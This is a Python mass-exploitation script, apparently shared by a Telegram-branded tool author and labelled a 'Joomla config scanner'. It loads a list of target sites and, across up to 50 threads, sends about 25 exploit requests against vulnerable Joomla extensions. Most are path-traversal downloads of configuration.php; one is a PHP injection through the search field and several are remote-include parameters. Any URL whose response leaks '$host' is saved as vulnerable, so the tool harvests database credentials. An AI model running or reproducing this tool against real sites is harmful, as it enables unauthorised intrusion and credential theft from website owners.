import requests
import sys
import time
import re
import os
from pystyle import Colors,Colorate,Write
from fake_useragent import UserAgent
from colorama import Fore,Style,init
from rich import print as cetak
from multiprocessing.dummy import Pool, Lock, Semaphore
import requests,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Pool
init(autoreset=True)
headersx = {'User-Agent': UserAgent().random}
red = Fore.RED
green = Fore.GREEN 
yellow = Fore.YELLOW
white = Fore.WHITE
blue = Fore.BLUE
MAX_THREADS = 50
thread_semaphore = Semaphore(MAX_THREADS)
thread_lock = Lock()
def clear():
	if sys.platform.startswith('linux'):
		os.system('clear')
	elif sys.platform.startswith('freebsd'):
		os.system('clear')
	else:
		os.system('cls')
def gui():
	Write.Print("─══════════════════════════ቐቐ══════════════════════════─\n", Colors.blue_to_purple, interval=0.01)
	text = f""" 
 █████╗ ██╗  ██╗██╗   ██╗    ██████╗  ██████╗ ████████╗
██╔══██╗╚██╗██╔╝██║   ██║    ██╔══██╗██╔═══██╗╚══██╔══╝
███████║ ╚███╔╝ ██║   ██║    ██████╔╝██║   ██║   ██║   
██╔══██║ ██╔██╗ ╚██╗ ██╔╝    ██╔══██╗██║   ██║   ██║   
██║  ██║██╔╝ ██╗ ╚████╔╝     ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝      ╚═════╝  ╚═════╝    ╚═╝  

# CREATED BY : t.me/AXVDIGITAL
# TOOLS NAME : JOOMLA CONFIG SCANNER
# SAVED TO : results/joomla_config.txt"""
	for N, line in enumerate(text.split("\n")):
		print(Colorate.Horizontal(Colors.red_to_green, line, 1))
		time.sleep(0.05)
	Write.Print("\n─══════════════════════════ቐቐ══════════════════════════─\n\n", Colors.blue_to_purple, interval=0.01)
 

def jomfig(domain):
	list = ['/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0', 
		 	'/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php', 
			'/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1', 
			'/index.php?option=com_jetext&task=download&file=../../configuration.php', 
			'/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php', 
			'/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php', 
			'/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==', 
			'/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php', 
			'/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php', 
			'/index.php?option=com_macgallery&view=download&albumid=../../configuration.php', 
			'/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php', 
			'/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes', 
			'/index.php?option=com_cckjseblod&task=download&file=configuration.php', 
			'/index.php?option=com_user&view=reset&layout=confirm', 
			'/index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B', 
			'/index.php?option=com_content&view=archive', 
			'/index.php?option=com_mailto&view=archive', 
			'/index.php?option=com_users&view=archiv', 
			'/index.php?option=com_installer&view=archive', 
			'/admin.advancedpoll.php?mosConfig_live_site=', 
			'/admin.Akocomment.php?mosConfig_live_site=', 
			'/lang.php?mosConfig_absolute_path=', 
			'/plugins/content/jw_allvideos/includes/download.php?file=./../.../configuration.php', 
			'/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php', 
			'/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php'
	]
	for jomfig in list:
		try:
			headersx = {'User-Agent': UserAgent().random}
			domain = ''.join(domain)
			domain = domain.strip()
			domain = re.sub(r'https?://', '', domain)
			jomfig = jomfig.strip()
			req_jomfig = requests.get(f"http://{domain}{jomfig}", headers=headersx, timeout=7, verify=False).text
			if '$host' in req_jomfig:
				open("results/joomla_config.txt","a+").write(f"http://{domain}{jomfig}\n")
				print(f"{blue}|- {white}http://{domain}{jomfig} {yellow}| {green}Vuln!")
			else:
				print(f"{blue}|- {white}http://{domain}{jomfig} {yellow}| {red}Not Vuln!")
		except:pass
  

def jomfigInput():
	domain = open(input(f"{red}[{white}#{red}]{white} LIST SITE : ")).readlines()
	thr = int(input(f"{red}[{white}#{red}]{white} THREADS (Max 50): "))
	ThreadPool = Pool(thr)
	ThreadPool.map(jomfig, domain)
 
 
if __name__ == "__main__":
            time.sleep(1)
            clear()
            gui()
            jomfigInput()
    